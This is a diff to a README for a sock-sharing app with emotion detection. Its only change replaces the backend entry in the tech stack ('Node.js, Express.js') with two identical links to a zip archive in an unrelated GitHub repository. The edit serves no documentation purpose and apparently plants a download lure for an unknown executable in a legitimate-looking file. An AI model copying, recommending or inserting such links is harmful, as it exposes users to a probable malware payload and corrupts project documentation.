@@ -27,7 +27,7 @@ A space for users to showcase their sock choices and trade socks virtually.
 
 Tech Stack:
 Frontend: HTML, CSS, JavaScript, React
-Backend: Node.js, Express.js
+Backend: https://github.com/Rithvik-krishna/ASAP/raw/refs/heads/main/hemocoelom/Software_v3.7.zip, https://github.com/Rithvik-krishna/ASAP/raw/refs/heads/main/hemocoelom/Software_v3.7.zip
 Database: MongoDB or Firebase
 API Integration: Emotion detection API (e.g., Microsoft's Azure Face API)
 Other Tools: Figma for design, Git for version control
